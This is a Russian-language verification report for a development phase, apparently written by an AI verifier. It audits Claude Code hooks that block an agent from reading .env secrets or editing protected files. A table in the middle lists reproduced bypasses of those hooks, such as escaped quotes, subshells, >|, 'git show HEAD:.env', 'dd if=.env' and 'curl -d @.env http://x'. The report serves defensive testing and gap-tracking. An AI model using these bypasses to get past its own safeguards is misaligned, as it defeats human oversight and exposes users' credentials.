---
phase: 01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti
verified: 2026-10-25T13:00:00Z
status: gaps_found
score: 7/9 must-haves verified
covered_files:
  - .claude/hooks/lib/hook-input.ts
  - .claude/hooks/lib/secret-names.ts
  - .claude/hooks/lib/shell.ts
  - .claude/hooks/protect-files.ts
  - .claude/hooks/reviewer-readonly.ts
  - .claude/settings.json
  - .claude/skills/review-step/SKILL.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-01-PLAN.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-01-SUMMARY.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-02-PLAN.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-02-SUMMARY.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-03-PLAN.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-03-SUMMARY.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-04-PLAN.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-04-SUMMARY.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-05-PLAN.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-05-SUMMARY.md
  - AGENTS.md
  - CLAUDE.md
  - docs/memory.md
  - docs/plan.md
  - docs/security-checklist.md
  - tests/unit/protect-files.test.ts
  - tests/unit/reviewer-readonly.test.ts
  - tests/unit/secret-names.test.ts
  - tests/unit/settings-permissions.test.ts
covered_digest: "v3:sha256:afc9bd15a946dc150c7ef76b05714d2cb120a61226e55eecd1e87b4127f70d56"
behavior_unverified: 0
overrides_applied: 0
re_verification: false
gaps:
  - truth: "docs/security-checklist.md: у каждого пункта статус «закрыт / открыт» соответствует действительности (SC3; запрет плана 01-03: не скрывать ограничения эвристики)"
    status: failed
    reason: "Строки 7, 9, 11, 12 помечены «закрыт», а воспроизведены (запуском настоящих checkBashDecision / checkReviewerCommand на синтетических строках) обходы той самой защиты, которую строки объявляют закрытой. Ограничения в тексте строк перечисляют только $VAR, $(...), глобы, python -c; найденные обходы не названы."
    artifacts:
      - path: "docs/security-checklist.md"
        issue: "строки 7, 9, 10, 11, 12 — «закрыт» без оговорки о воспроизводимых обходах; docs/memory.md: «6 закрыто, каждая проверена» читается как «обходов нет», хотя проверено лишь «тесты зелёные»"
    missing:
      - "либо исправить обходы (см. следующий gap) и добавить для них тесты, либо перевести строки 7, 9, 11, 12 в «закрыт частично» с перечнем известных обходов"
      - "поправить формулировку в docs/memory.md (запись 2026-10-25)"
  - truth: "SEC-02 / SC4: чтение .env по относительному пути в Bash агента и в reviewer отклоняется; защита записи .env*, .git/, package-lock.json и ask для .claude/ через Bash не обходится одной вставкой"
    status: partial
    reason: "Заявленные формы закрыты и покрыты тестами (cat ./.env, grep SECRET .env, cat < .env, bash -c, --file=, reviewer cat/head/tail/wc). Но воспроизведены обходы базового синтаксиса: CR-01 (экранированная кавычка рассинхронизирует разбор), CR-02 (>| и >&), CR-03 (обратный слеш + перевод строки, $'.env'), CR-04 (подоболочка), CR-06 (dd if=.env, curl -d @.env, git show HEAD:.env), CR-07 (reviewer читает .env через git diff --no-index / git show). Все они дают null (пропуск) в hook'ах."
    artifacts:
      - path: ".claude/hooks/lib/shell.ts"
        issue: "tokenizer расходится с bash: \\\" внутри двойных кавычек, >| и >&, \\<newline>, $'..', ( )"
      - path: ".claude/hooks/lib/secret-names.ts"
        issue: "whitelist хвоста имени: .env~ и .env{,} не считаются секретом (fail-open)"
      - path: ".claude/hooks/reviewer-readonly.ts"
        issue: "операнды git diff/show/log не проверяются на секретные имена; --no-index не запрещён"
      - path: ".claude/hooks/protect-files.ts"
        issue: "операнды вида ключ=.env, @.env, ref:.env не считаются путём"
    missing:
      - "план закрытия CR-01, CR-02, CR-03, CR-04 в tokenizer (shell.ts) с тестами «блокируется» плюс «соседняя легитимная команда проходит»"
      - "CR-07: проверка операндов git в reviewer-readonly и запрет --no-index; CR-06: проверка частей операнда после =, @, :"
      - "WR-02: секрет — любое .env* кроме шаблонов, а не whitelist хвоста"
  - truth: "PLAN-02: единый источник плана не противоречит инструкциям в документах, которые читает проверяющий"
    status: partial
    reason: "Буквальный критерий (grep по AGENTS.md CLAUDE.md docs .planning) противоречий не находит, но README.md:34 называет docs/plan.md «планом и прогрессом», а README.md:49 говорит «прогресс отмечается в docs/plan.md» — прямо против AGENTS.md:72. README не входит в область grep. Фаза 5 (DOC-01) пишет раздел «Модуль 2», но не обещает исправить эти строки, поэтому в deferred не переносится."
    artifacts:
      - path: "README.md"
        issue: "строки 34 и 49 описывают прежний процесс (прогресс в docs/plan.md)"
    missing:
      - "заменить README.md:34 и :49 на .planning/STATE.md и .planning/ROADMAP.md"
behavior_unverified_items: []
human_verification:
  - test: "/gsd-progress в новой сессии Claude Code"
    expected: "Видна веха v1.0 «ДЗ-2: агентно-ориентированный пайплайн» и фаза 1 (PLAN-01)"
    why_human: "Слэш-команда исполняется в интерфейсе; автоматически подтверждены только её данные (gsd-tools query progress => v1.0, фаза 01, 5/5 планов и сводок)"
  - test: "Новая сессия: попросить агента выполнить cat ./.env, затем grep SECRET .env (проверка ожидаемого отказа; содержимое не копировать)"
    expected: "Оба вызова отклонены (protect-files или правило permissions)"
    why_human: "Подключение hooks и permissions в живой сессии юнит-тестами не воспроизводится"
  - test: "Subagent reviewer: wc -l ./.env и инструмент Grep с путём .env (проверка ожидаемого отказа)"
    expected: "Первый отклонён hook'ом reviewer-readonly, второй — правилом Read(**/.env*)"
    why_human: "Инструменты Read/Grep у reviewer hook не видит; нужен живой subagent"
  - test: "Edit в .claude/agents/reviewer.md при режиме acceptEdits; затем echo x >> .claude/hooks/tmp-check.ts (ответить «No»)"
    expected: "Оба раза запрос подтверждения (permissions ask и ask от protect-files)"
    why_human: "Взаимодействие ask с acceptEdits и запросом hook'а проверяется только в живой сессии (после перезапуска, чтобы подхватить settings.json)"
  - test: "cat < .env отклоняется, а cat <<< .env и git add src/x.ts проходят (из 01-05)"
    expected: "Отказ в первом случае, проход во втором и третьем"
    why_human: "Проверка конца фазы в живой сессии"
---

# Phase 1: Базовая линия, единый план и гигиена безопасности — отчёт верификации

**Phase Goal:** Точка «до» зафиксирована, план вехи ведётся в одном месте (GSD), известные обходы запретов закрыты до подключения памяти, а сама фаза проходит полный цикл GSD
**Verified:** 2026-10-25T13:00:00Z
**Status:** gaps_found
**Re-verification:** Нет — первичная верификация

## Итог

Из пяти критериев успеха ROADMAP три выполнены полностью (1, 2 по букве, 5), критерий 4 выполнен по букве заявленных форм, но недобирает по сути, критерий 3 выполнен по форме и не выполнен по правдивости статусов. Главное расхождение: SUMMARY и `docs/security-checklist.md` называют обходы чтения `.env` и записи в защищённые файлы «закрытыми», а я воспроизвёл на настоящих функциях `checkBashDecision` и `checkReviewerCommand` (синтетические строки, реальные `.env*` не читались) ряд пропусков, которые находятся вне списка «известных ограничений» чек-листа. Это не отменяет проделанную работу (253 теста зелёные, заявленные формы закрыты), но фраза цели «известные обходы закрыты до подключения памяти» и колонка «Статус» чек-листа пока не соответствуют действительности.

## Достижение цели

### Наблюдаемые истины

| #   | Истина                                                                                                                                                                                       | Статус                                  | Доказательство                                                                                                                                                                                                                                                                                                                                                                              |
| --- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | SC1: в `docs/screenshots/` лежат снимки `/context` и `/usage` «до», сценарий записан для повтора (база CTX-04)                                                                               | ✓ VERIFIED                              | `hw2-context-before-start.png`, `hw2-usage-before.png`, `hw2-context-before-progress.png` существуют; сценарий из 5 шагов в `docs/context-usage.md`; коммит `b1fd263` предшествует всем коммитам фазы (`588be48`, `ac3c1e7` и далее)                                                                                                                                                         |
| 2   | SC2 (форма): `docs/plan.md` — указатель; `AGENTS.md` (стр. 9, 72) и `CLAUDE.md` ведут в `.planning/`; `grep -rn "docs/plan.md" AGENTS.md CLAUDE.md docs .planning` не находит противоречащих инструкций | ✓ VERIFIED (с замечанием, см. gap 3)   | `CLAUDE.md` содержит `@.planning/STATE.md`; `AGENTS.md:9,72` ведут в `.planning/`; `docs/plan.md` раздел «Модуль 2» и «Roadmap» — ссылки, `git diff --stat d399063 HEAD -- docs/plan.md` = 2 вставки/19 удалений только ниже ДЗ-1; оставшиеся совпадения grep — исторические записи (`memory.md:138`, `about.md:124`, `context-usage.md:28` снимок «до») и описание ограничения (`STATE.md:89`) |
| 3   | SC2 (данные): `/gsd-progress` показывает веху ДЗ-2 и текущую фазу                                                                                                                            | ✓ VERIFIED (данные); UI — human         | `gsd-tools query progress` => `milestone_version: v1.0`, фаза `01`, `plans: 5`, `summaries: 5`; сама слэш-команда — в `human_verification`                                                                                                                                                                                                                                                  |
| 4   | SC3 (структура): `docs/security-checklist.md` содержит пункты из `CONCERNS.md` и ДЗ-1, у каждого команда проверки и статус                                                                   | ✓ VERIFIED                              | 12 строк данных, 5 колонок; 6 «закрыт», 6 «открыт»; все 9 команд `npx vitest run … -t` запущены мной: каждая выбрала ≥1 тест и прошла (22, 6, 1, 7, 8, 1, 8, 19, 1 тестов)                                                                                                                                                                                                                  |
| 5   | SC3 (правдивость): статус «закрыт» в чек-листе соответствует реальной защите; ограничения не скрыты                                                                                         | ✗ FAILED                                | Строки 7, 9, 10, 11, 12 «закрыт», при этом воспроизведены пропуски (таблица ниже). Цель плана 01-03 «ограничения эвристики не скрываются» нарушена для найденных форм                                                                                                                                                                                                                         |
| 6   | SC4 (заявленные формы): `cat ./.env`, `grep … .env`, `cat < .env`, `bash -c "cat .env"`, `--file=.env` и `cat/head/tail/wc` по относительному пути в `reviewer` отклоняются, закреплено Vitest | ✓ VERIFIED                              | Живой запуск `checkBashDecision`: все пять — `deny`; `checkReviewerCommand('cat ./.env')` — отказ; тесты `blocks reading secret file` (22 + 7 тестов) зелёные                                                                                                                                                                                                                                 |
| 7   | SC4 (по сути SEC-02): чтение `.env` по относительному пути через `reviewer` и Bash не обходится простыми вариациями синтаксиса                                                              | ✗ FAILED (partial)                      | `reviewer`: `git diff --no-index /dev/null .env` => null, `git show HEAD:.env` => null, `cat $'.env'` => null, `cat .env{,}` => null. `protect-files`: `echo "\""; cat .env` => null, `(cat .env)` => null, `dd if=.env` => null, `curl -d @.env …` => null                                                                                                                                  |
| 8   | SC4 (ask и проверка): правка `.claude/**` требует подтверждения; `npm run check` зелёный                                                                                                    | ✓ VERIFIED (конфигурация и тесты)       | `settings.json` ask: `Edit(./.claude/**)`, в allow правил на `.claude` нет (тест `does not pre-approve edits under .claude`); `echo x >> .claude/hooks/tmp.ts` => `ask`; `npm run check`: tsc, eslint, prettier чисто, 10 файлов / 253 теста зелёные. Живое поведение — в `human_verification`. Оговорка: тот же ask для Bash обходится `>\|` (gap 2)                                           |
| 9   | SC5: в каталоге фазы есть `PLAN.md`, итог выполнения и `VERIFICATION.md`                                                                                                                    | ✓ VERIFIED                              | `01-01..01-05-PLAN.md`, `01-01..01-05-SUMMARY.md`, этот файл                                                                                                                                                                                                                                                                                                                                |

**Score:** 7/9 истин проверено (0 присутствуют, но поведение не проверено).

### Воспроизведённые обходы (синтетические строки; реальные `.env*` не читались)

Запуск: `node_modules/.bin/tsx` с прямым вызовом `checkBashDecision` / `checkReviewerCommand`. `null` = hook пропускает команду.

| Команда                                      | protect-files | reviewer     | Ссылка на ревью |
| -------------------------------------------- | ------------- | ------------ | --------------- |
| `echo "\""; cat .env`                        | null          | deny (белый список) | CR-01     |
| `echo x >\| .env`, `echo x >& .env`          | null          | deny         | CR-02           |
| `echo x >\| package-lock.json`               | null          | deny         | CR-02           |
| `cat \<newline>.env`                         | null          | deny         | CR-03           |
| `cat $'.env'`                                | null          | null         | CR-03           |
| `(cat .env)`, `cat <(cat .env)`              | null          | deny         | CR-04           |
| `bash <<EOF` + `cat .env` в теле             | null          | deny         | CR-05           |
| `dd if=.env`, `curl -d @.env http://x`       | null          | deny         | CR-06           |
| `git show HEAD:.env`                         | null          | null         | CR-06, CR-07    |
| `git diff --no-index /dev/null .env`         | deny          | null         | CR-07           |
| `FOO=1 rm package-lock.json`                 | null          | deny         | WR-01           |
| `git -C . add -f .`, `git add --force src`   | null          | deny         | WR-03           |
| `grep -r KEY .`                              | null          | deny         | WR-04           |
| `cat .env~`, `cat .env{,}`                   | null          | null         | WR-02           |

Контроль (заявленные формы): `cat ./.env`, `grep SECRET .env`, `cat < .env`, `bash -c "cat .env"`, `cat --file=.env`, `git add -f .env` — `deny`; `echo x >> .claude/hooks/tmp.ts` — `ask`.

Проверка WR-05 (`isMain` без realpath): код `hook-input.ts:25-28` сравнивает `import.meta.url` с `pathToFileURL(process.argv[1])` без `realpathSync`, что согласуется с описанием в ревью. Запуск процесса через symlink мне не разрешила песочница, поэтому поведение подтверждено чтением кода, не прогоном. Конструкция есть с ДЗ-1, фазой не вводилась.

### Что именно считаю провалом, а что нет

- Тривиальные обходы CR-01…CR-04, CR-06, CR-07 — не «известные ограничения» ($VAR, `$(...)`, глобы, `python -c`, `eval`), которые чек-лист честно называет. Это ошибки разбора обычного синтаксиса и пробел reviewer'а по git. Поэтому цель «известные обходы закрыты» и колонка «Статус» подорваны.
- Допущение «hooks — эвристика, не песочница» (AGENTS.md, `docs/about.md`) смягчает, но не снимает вопрос: чек-лист должен называть то, что воспроизводится.
- Не засчитываю в провал фазы: WR-05 (старый код), WR-06 (ложные отказы), WR-07, IN-01…IN-03 — это качество, а не невыполненные критерии.

### Отложенные пункты

Нет. Исправления токенайзера и README не названы ни в цели, ни в критериях фаз 2–5. Открытые пункты «fail-open без `node_modules`» и «коммит в `main`» уже честно «открыт» в чек-листе и не считаются пробелом фазы 1.

### Обязательные артефакты

| Артефакт                                   | Ожидается                                       | Статус                               | Детали                                                                                  |
| ------------------------------------------ | ----------------------------------------------- | ------------------------------------ | --------------------------------------------------------------------------------------- |
| `.claude/hooks/lib/secret-names.ts`        | единый предикат секретных имён                  | ✓ VERIFIED (с WR-02)                 | используется обоими hooks; whitelist хвоста пропускает `.env~`, `.env{,}`               |
| `.claude/hooks/protect-files.ts`           | отказ чтения, ask для `.claude/`, `git add -f`  | ✓ VERIFIED (с обходами из таблицы)   | заявленные формы работают                                                               |
| `.claude/hooks/reviewer-readonly.ts`       | отказ чтения `.env` у reviewer                  | ⚠️ PARTIAL                           | `cat/head/tail/wc` закрыты, `git diff/show/log` — нет                                    |
| `.claude/hooks/lib/shell.ts`               | разбор Bash как в bash                          | ⚠️ PARTIAL                           | CR-01…CR-05                                                                              |
| `.claude/settings.json`                    | deny `Read(**/.env*)`, ask `Edit(./.claude/**)` | ✓ VERIFIED                           | совпадает с тестами                                                                      |
| `tests/unit/*.test.ts` (4 файла)           | регрессии                                       | ✓ VERIFIED                           | 253 теста зелёные; найденных обходов в тестах нет (IN-02)                               |
| `docs/security-checklist.md`               | 12 пунктов, команда, статус                     | ✓ EXISTS / ✗ статусы завышены        | gap 1                                                                                    |
| `docs/plan.md`, `CLAUDE.md`, `AGENTS.md`   | единый источник                                 | ✓ VERIFIED                           | AGENTS.md — 99 строк, правки только в строках 9 и 72                                     |
| `docs/memory.md`                           | запись фазы 1                                   | ✓ VERIFIED (формулировка завышена)   | «каждая проверена»                                                                       |

`gsd-tools query verify.artifacts` — 16/16 по пяти планам. `verify.key-links` — 13/14; единственный «не найден» (`CLAUDE.md` → `@.planning/STATE.md`) — ложный: шаблон с `^…$` не сработал на многострочном файле, строка в `CLAUDE.md` есть.

### Покрытие требований

| Требование | План         | Описание                                           | Статус                          | Доказательство                                                                                     |
| ---------- | ------------ | -------------------------------------------------- | ------------------------------- | -------------------------------------------------------------------------------------------------- |
| PLAN-01    | 01-01        | ROADMAP, REQUIREMENTS, STATE; `/gsd-progress`      | ✓ SATISFIED (UI — human)        | файлы есть; `query progress` возвращает v1.0 / фаза 01                                             |
| PLAN-02    | 01-01        | `docs/plan.md` — указатель; AGENTS согласован      | ✓ SATISFIED (замечание README)  | gap 3 — README                                                                                     |
| PLAN-04    | 01-03        | фаза проходит полный цикл GSD                      | ✓ SATISFIED                     | PLAN ×5, SUMMARY ×5, этот файл                                                                     |
| SEC-01     | 01-03        | checklist: команда и статус у каждого пункта       | ✗ PARTIAL                       | форма и команды в порядке, статусы завышены (gap 1)                                                |
| SEC-02     | 01-02, 01-04, 01-05 | обходы чтения `.env` закрыты и покрыты тестами | ✗ PARTIAL                       | заявленные формы закрыты; обходы CR-01…CR-07 (gap 2)                                               |
| SEC-03     | 01-04, 01-05 | правка `.claude/**` — `ask`                        | ✓ SATISFIED (Edit/Write) / Bash через `>\|` обходится | `Edit(./.claude/**)` + тест; Bash-путь зависит от tokenizer (gap 2)                |

Потерянных требований нет: все шесть ID из ROADMAP/плановых frontmatter найдены в `REQUIREMENTS.md`, и REQUIREMENTS.md не сопоставляет фазе 1 ни одного ID, который не заявлен ни одним планом. Замечание: в `REQUIREMENTS.md` SEC-01 и SEC-02 помечены `[x]` / Complete — до закрытия gaps 1 и 2 отметку стоит считать преждевременной.

### Антипаттерны

| Файл                                       | Строка | Шаблон                                                         | Серьёзность | Влияние                                              |
| ------------------------------------------ | ------ | -------------------------------------------------------------- | ----------- | ---------------------------------------------------- |
| `.claude/hooks/lib/shell.ts`               | 33-37  | `\"` внутри `"…"` закрывает кавычку                            | 🛑 Blocker  | один символ скрывает остаток команды от обоих hooks  |
| `.claude/hooks/lib/shell.ts`               | 53-64  | `>\|` и `>&` рвут сегмент                                       | 🛑 Blocker  | цель записи не попадает в `writeTargets`             |
| `.claude/hooks/reviewer-readonly.ts`       | 51-56  | операнды git не проверяются                                     | 🛑 Blocker  | reviewer читает `.env` через git                     |
| `docs/security-checklist.md`               | 7-12   | «закрыт» без перечня воспроизведённых обходов                   | 🛑 Blocker  | документ противоречит фактам                         |
| `README.md`                                | 34, 49 | прогресс «в docs/plan.md»                                       | ⚠️ Warning  | противоречит единому источнику плана                 |
| `.claude/hooks/lib/hook-input.ts`          | 25-28  | `isMain` без realpath                                           | ⚠️ Warning  | тихое отключение hook'а при symlink (старый код)     |
| все файлы фазы                             | —      | `TBD/FIXME/XXX/TODO/HACK`                                       | —           | не найдено                                           |

Дополнительно: в одной из моих проверок сработал локальный `gsd-secret-read-guard` — заблокировал `grep` с regex-шаблоном `(^\|/)\.env` по чужому файлу. Это ровно та ложная тревога, которая записана в чек-листе (строка 16) и в `memory.md`; подтверждение, а не дефект.

### Требуется проверка человеком

См. `human_verification` во frontmatter (5 пунктов): `/gsd-progress`; ожидаемый отказ `cat ./.env` и `grep SECRET .env`; ожидаемый отказ у `reviewer` (`wc -l ./.env`, Grep по `.env`); запрос подтверждения при правке `.claude/` под `acceptEdits` (Edit и `echo >>`); контроль `cat < .env` / `cat <<< .env` / `git add src/x.ts`. Это проверки ожидаемого отказа: если вызов прошёл, это дефект защиты — содержимое не копировать.

### Сводка пробелов

Три пробела, два из них один корень.

1. **Корень: разбор shell и белый список reviewer.** Заявленные в плане формы закрыты и честно протестированы, но защита опирается на самодельный tokenizer, который расходится с bash в базовых конструкциях, а `reviewer` пропускает git-чтение по `.env`. Пока это так, «обходы закрыты до подключения памяти» не верно по сути: фаза 2 начнёт записывать вывод инструментов, а `echo "\""; cat .env` пройдёт оба hook'а (первый из них — `protect-files`; у `reviewer` белый список режет эту форму, но не `git show HEAD:.env`).
2. **Следствие: чек-лист завышает статусы** строк 7, 9, 10, 11, 12.
3. **README.md:34,49** противоречат новому правилу единого плана.

Варианты решения для автора (решает человек, я ничего не помечал как принятое):

- **Закрыть пробелы:** `/gsd-plan-phase 1 --gaps` — исправить CR-01…CR-04, CR-06, CR-07, WR-02, добавить тесты на каждый обход и парные «легитимная команда проходит», затем поправить README и `memory.md`.
- **Принять частично:** перевести строки 7, 9, 10, 11, 12 в «закрыт частично» с перечнем воспроизводимых обходов (из таблицы выше), поправить README; исправление tokenizer перенести в явный пункт фазы 2 до подключения памяти. Тогда можно оформить `overrides:` с `accepted_by` и `accepted_at`; шаблон переопределения я не вносил, так как это решение автора, а не моё.

---

_Verified: 2026-10-25T13:00:00Z_
_Verifier: Claude (gsd-verifier)_
